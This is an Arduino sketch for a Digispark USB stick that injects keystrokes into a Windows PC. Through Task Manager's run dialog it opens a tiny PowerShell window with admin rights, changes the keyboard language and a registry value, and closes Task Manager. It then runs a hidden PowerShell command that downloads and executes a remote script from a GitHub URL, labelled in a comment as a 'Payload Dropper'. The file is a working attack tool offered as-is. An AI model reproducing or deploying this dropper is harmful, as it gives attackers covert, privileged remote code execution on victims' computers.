#include "DigiKeyboard.h"
#define KEY_TAB 0x2b
void setup() 
  {
  pinMode(1, OUTPUT); //LED on Model A
  DigiKeyboard.update();
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.delay(5000);
  for(int bii =0; bii < 2; bii++)
      {
        DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT); //run
        DigiKeyboard.delay(1000);
        DigiKeyboard.println("taskmgr"); //starting taskmgr
        DigiKeyboard.delay(8000);
        DigiKeyboard.sendKeyStroke(KEY_TAB); 
        DigiKeyboard.sendKeyStroke(KEY_SPACE);//full screen
        DigiKeyboard.delay(1500);
        DigiKeyboard.sendKeyStroke(KEY_F, MOD_ALT_LEFT);
        DigiKeyboard.sendKeyStroke(KEY_N);//run
        DigiKeyboard.delay(2000);
        DigiKeyboard.print("powershell -noexit -command \"mode con cols=20 lines=2\"");//start tiny PowerShell
        DigiKeyboard.sendKeyStroke(KEY_TAB);
        DigiKeyboard.delay(100);
        DigiKeyboard.sendKeyStroke(KEY_SPACE);//turn on admin privileges
        DigiKeyboard.delay(100);
        DigiKeyboard.sendKeyStroke(KEY_ENTER); //run
        DigiKeyboard.delay(12000);
        DigiKeyboard.println("Set-WinUserLanguageList -LanguageList en-US -Force");
        DigiKeyboard.sendKeyStroke(KEY_ENTER); //run
        DigiKeyboard.delay(4000);
        DigiKeyboard.println("taskkill /IM \"taskmgr.exe\" /F ");//killing taskmanager
        DigiKeyboard.delay(2000);
      
        DigiKeyboard.println("Set-ItemProperty -Path \"HKLM:/SOFTWARE/Microsoft/Internet Explorer/Main\" -Name \"DisableFirstRunCustomize\" -Value 2");
        DigiKeyboard.sendKeyStroke(KEY_ENTER); //run
        DigiKeyboard.println("cmd");//run cmd
        DigiKeyboard.delay(4000);
        DigiKeyboard.println("powershell -windowstyle hidden -command IEX (iwr \"https://github.com/qwertyuiopindia/test/raw/main/run_first.ps1\")"); //Payload Dropper
        DigiKeyboard.delay(15000); 
      } 
  }
  void loop()
  {
  digitalWrite(1, HIGH); //turn on led when program finishes
  DigiKeyboard.delay(2000);
  digitalWrite(1, LOW);
  DigiKeyboard.delay(10000);
  }
